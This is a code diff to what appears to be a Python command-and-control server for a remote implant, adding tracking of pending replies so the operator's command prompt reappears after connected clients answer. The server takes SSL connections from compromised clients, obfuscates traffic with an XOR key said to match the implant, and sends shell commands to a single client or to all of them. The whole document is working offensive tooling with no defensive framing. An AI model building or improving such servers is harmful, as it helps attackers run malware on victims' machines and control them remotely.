@@ -10,6 +10,8 @@ XOR_KEY = b"sneaky_key"  # Must match implant key
 
 clients = {}
 lock = threading.Lock()
+pending_responses = 0
+pending_lock = threading.Lock()
 
 # XOR encrypt/decrypt
 def xor_encrypt_decrypt(data, key):
@@ -29,6 +31,17 @@ def handle_client(client_socket, addr, client_id):
             with lock:
                 sys.stdout.buffer.write(f"\n[Client {client_id}] ".encode() + decrypted)
                 sys.stdout.flush()
+
+            with pending_lock:
+                global pending_responses
+                pending_responses -= 1
+                if pending_responses == 0:
+                    with lock:
+                        if len(clients) == 1:
+                            sys.stdout.write(f"\n[>] ({client_id}) $ ")
+                        else:
+                            sys.stdout.write("\n[>] Command (format: client_id command OR all command): ")
+                        sys.stdout.flush()
 
     except Exception as e:
         print(f"[!] Exception with client {client_id}: {e}")
@@ -63,6 +76,10 @@ def command_sender():
                 command = cmd.encode() + b"\n"
                 encrypted = xor_encrypt_decrypt(command, XOR_KEY)
 
+                with pending_lock:
+                    global pending_responses
+                    pending_responses = 1
+
                 with lock:
                     clients[client_id].sendall(encrypted)
 
@@ -82,12 +99,17 @@ def command_sender():
 
                 with lock:
                     if target == 'all':
+                        with pending_lock:
+                            pending_responses = len(clients)
+
                         for c_id, sock in clients.items():
                             sock.sendall(encrypted_command)
                     else:
                         try:
                             c_id = int(target)
                             if c_id in clients:
+                                with pending_lock:
+                                    pending_responses = 1
                                 clients[c_id].sendall(encrypted_command)
                             else:
                                 print(f"[!] No such client ID {c_id}")
@@ -122,8 +144,6 @@ def main():
         with lock:
             clients[client_id] = ssl_socket
             print(f"\n[+] New SSL connection: Client {client_id} from {addr[0]}:{addr[1]}")
-            sys.stdout.write("\n[>] Command (format: client_id command OR all command): ")
-            sys.stdout.flush()
 
         client_thread = threading.Thread(target=handle_client, args=(ssl_socket, addr, client_id))
         client_thread.daemon = True
